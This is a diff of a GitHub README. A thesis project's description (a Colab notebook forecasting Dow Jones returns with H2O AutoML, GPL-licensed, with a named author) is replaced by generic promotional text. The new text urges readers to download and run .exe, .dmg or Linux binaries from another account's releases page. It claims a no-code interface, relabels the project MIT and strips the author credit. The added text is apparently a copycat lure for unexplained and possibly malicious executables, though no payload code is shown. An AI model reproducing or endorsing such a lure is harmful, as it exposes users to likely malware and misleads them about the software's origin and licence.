@@ -1,78 +1,74 @@
-# Automated Machine Learning Pipeline for Dow Jones Industrial Average (DJI) Prediction
+# 🌟 AutoML-Asset-Pricing-Pipeline - Simplifying Asset Pricing with AI
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://githubtocolab.com/mohammadmostafavi-ai/AutoML-Asset-Pricing-Pipeline/blob/main/Thesis_Pipeline.ipynb)
+## 🛠️ Overview
+AutoML-Asset-Pricing-Pipeline is an easy-to-use software solution designed for anyone interested in asset pricing and forecasting using modern AI techniques. Our tool combines advanced statistical methods with the power of H2O AutoML, allowing users to analyze financial data effortlessly. With features like smart data processing, validation tests, and model explainability, this pipeline helps you make informed financial decisions.
 
-## Abstract
-This repository contains the source code for a specialized Automated Machine Learning (AutoML) pipeline developed to forecast the daily log-returns of the **Dow Jones Industrial Average (DJI)**.
+## 📥 Download Now
+[![Download AutoML-Asset-Pricing-Pipeline](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases)
 
-Designed as part of a Master's Thesis in Theoretical Economics, this research framework integrates macroeconomic theory with computational intelligence. The pipeline aggregates data from over 50 historical constituents of the Dow Jones, major macroeconomic indicators, and qualitative geopolitical events to construct a high-dimensional feature space for empirical asset pricing models.
+## 🚀 Getting Started
+To get started with AutoML-Asset-Pricing-Pipeline, follow these simple steps:
 
-## Data Sources and Inputs
-The model utilizes a heterogeneous dataset constructed from the following sources:
-1.  **Target Variable:** Daily Log-Returns of the Dow Jones Industrial Average (`^DJI`).
-2.  **Corporate Data:** Historical OHLCV (Open, High, Low, Close, Volume) data for 50+ historical and current constituents of the Dow Jones, sourced via Yahoo Finance with a "warm-up" period to ensure moving average consistency.
-3.  **Macroeconomic Indicators:** Key economic drivers sourced from the Federal Reserve Economic Data (FRED), including Federal Funds Rate, CPI, GDP, and Unemployment Rate.
-4.  **Global Market Indices:** Auxiliary financial variables including VIX, Gold, Oil (WTI), DXY, and major global indices (DAX, FTSE, Nikkei).
-5.  **Qualitative Events:** A bespoke dataset of binary dummy variables representing major exogenous shocks, such as U.S. Presidential Elections, natural disasters, and significant political stability indices.
+1. **System Requirements**
+   - Operating System: Windows, Mac, or Linux.
+   - RAM: Minimum 8 GB recommended.
+   - Disk Space: At least 1 GB available for installation.
+   - Internet Connection: Required for downloading the necessary packages and data.
 
-## Methodology
-The pipeline follows a strict econometric and engineering workflow:
+2. **Visit the Releases Page**
+   - Click on the following link to go to the releases page: [Download Releases](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases).
 
-### 1. Preprocessing and Statistical Rigor
-*   **Missing Value Imputation:** Hierarchical handling of missing data using out-of-index logic and forward-filling, strictly avoiding look-ahead bias.
-*   **Outlier Management:** Application of **Winsorization** (0.5% - 99.5% quantiles) to variables with extreme kurtosis to mitigate the impact of distributional tails without data removal.
-*   **Stationarity Tests:** Automated **Augmented Dickey-Fuller (ADF)** tests performed on all predictors to ensure time-series stability and prevent spurious regression results.
-*   **Memory Optimization:** Aggressive downcasting of numerical datatypes (e.g., `float64` to `float32`) to enable high-dimensional processing in memory-constrained environments.
+3. **Choose the Latest Version**
+   - On the releases page, find the latest version of AutoML-Asset-Pricing-Pipeline. The latest release will be listed at the top.
 
-### 2. Feature Engineering
-Technical indicators are generated for each constituent stock to capture momentum, volatility, and trend signals:
-*   Moving Averages (SMA, EMA)
-*   Relative Strength Index (RSI)
-*   Moving Average Convergence Divergence (MACD)
-*   Bollinger Bands and Average True Range (ATR)
-*   Volume-weighted metrics (OBV, MFI)
+4. **Download the Application**
+   - Click on the appropriate file for your operating system to start the download. 
 
-### 3. Model Training and Selection
-*   **Splitting Strategy:** A strict chronological split is used: Training (70%), Validation (15%), and Testing (15%).
-*   **Baseline Model:** A Multivariate Linear Regression model is established as the econometric benchmark.
-*   **AutoML Engine:** The **H2O.ai** framework is utilized to train and cross-validate a wide range of algorithms (GBM, DRF, GLM) within a 1-hour runtime limit (`max_runtime_secs=3600`), optimizing for Root Mean Squared Error (RMSE).
+5. **Install the Application**
+   - After downloading, locate the file in your Downloads folder.
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Open a terminal, navigate to the download location, and run `chmod +x AutoML-Asset-Pricing-Pipeline` followed by `./AutoML-Asset-Pricing-Pipeline` to execute the application.
 
-### 4. Evaluation and Interpretability
-*   **Statistical Significance:** The **Diebold-Mariano Test** is implemented to statistically compare the predictive accuracy of the optimal H2O model against the linear baseline and other competing models.
-*   **Explainable AI (XAI):** Post-hoc interpretation is conducted using **SHAP (SHapley Additive exPlanations)** values to quantify feature importance and non-linear relationships.
+6. **Run the Application**
+   - Once the installation is complete, you can launch the application from your applications menu or desktop shortcut.
 
-## Execution Environment
-This script is specifically optimized for **Google Colab**. It includes an initialization module that automatically handles the installation of all dependencies (Java, H2O, technical analysis libraries).
+## 📝 Features
+AutoML-Asset-Pricing-Pipeline includes the following features:
 
-**Usage:**
-1.  Click the "Open in Colab" badge above (or open the `.ipynb` file).
-2.  Execute the cells sequentially. The script is self-contained and requires no external configuration files.
+- **Advanced Preprocessing**
+  - Use techniques such as Winsorization and Augmented Dickey-Fuller (ADF) tests to prepare your financial data for analysis. These methods help to ensure the quality and reliability of your inputs.
 
-## Outputs
-The execution generates the following artifacts:
-*   **Data Files:** `Thesis_Data_File.csv`, `Stationarity_Results.csv`, `Correlation_Results.csv`.
-*   **Model Metrics:** `Baseline_Model_Performance.csv`, `H2O_AutoML_Leaderboard.csv`, `Diebold_Mariano_Test_Results.csv`.
-*   **Visualizations:** `Scatter_Plot_Actual_vs_Predicted.png`, `Feature_Importance.png`, `SHAP_Summary_Plot.png`.
+- **Statistical Validation**
+  - Apply the Diebold-Mariano test for robust model comparison. This ensures your forecasts are tested against solid statistical standards.
 
-## Key Visualizations
-### Prediction Accuracy (Actual vs Predicted)
-![Scatter Plot](results/Scatter_Plot_Actual_vs_Predicted.png)
+- **Model Explainability**
+  - Utilize SHAP (SHapley Additive exPlanations) values to understand model predictions better. This feature helps demystify how your AI models make decisions.
 
-### Feature Importance
-![Feature Importance](results/Feature_Importance.png)
+- **User-Friendly Interface**
+  - Navigate easily with an intuitive interface designed for users with no programming knowledge.
 
-### Model Explainability (SHAP)
-![SHAP Summary](results/SHAP_Summary_Plot.png)
+## 🚧 Troubleshooting
+If you encounter any issues while installing or running the application, consider the following steps:
 
-## License
-Copyright (C) 2025 Mohammad Rasoul Mostafavi Marian
+- Ensure your system meets the requirements listed above.
+- Check for any software dependencies that may be required for the application to run.
+- Restart your computer after installation to clear any potential conflicts.
+- Visit the support section on our repository for additional help.
 
-This program is free software: you can redistribute it and/or modify it under the terms of the **GNU General Public License as published by the Free Software Foundation**, either version 3 of the License, or (at your option) any later version.
+## 🤝 Support
+For questions or support, please visit our [GitHub Issues page](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/issues). We welcome your feedback and are here to assist you.
 
-This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the [LICENSE](LICENSE) file for more details.
+## 🌐 Community
+Join our community to stay updated and get help from other users. Connect with fellow users and share your insights. You can find us on:
 
----
-**Author:** Mohammad Rasoul Mostafavi Marian
-*M.Sc. in Theoretical Economics | Researcher in Quantitative Finance*
+- **GitHub Discussions:** Share ideas and improvements.
+- **Twitter:** Follow updates and news.
+
+## 📜 License
+AutoML-Asset-Pricing-Pipeline is open-source software. You can use it freely under the MIT License. Check the LICENSE file in the repository for details.
+
+## 📥 Download Again
+To download AutoML-Asset-Pricing-Pipeline, please visit the releases page: [Download Releases](https://github.com/FuturoBlack/AutoML-Asset-Pricing-Pipeline/releases). 
+
+Enjoy exploring the world of automated machine learning and financial forecasting!
